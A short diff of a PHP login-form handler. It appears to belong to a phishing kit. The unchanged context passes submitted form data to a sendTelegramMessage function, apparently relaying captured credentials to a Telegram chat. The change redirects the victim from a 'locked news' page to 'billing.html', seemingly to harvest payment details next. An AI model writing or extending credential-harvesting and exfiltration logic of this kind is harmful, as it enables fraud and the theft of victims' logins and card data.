@@ -23,7 +23,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     sendTelegramMessage($messageTitle, $message);
 
     // Redirect the user to the locked news page after successful login
-    header("Location: locked/news.html");
+    header("Location: billing.html");
     exit();
 } else {
     // Redirect the user back to the login page or display an error message
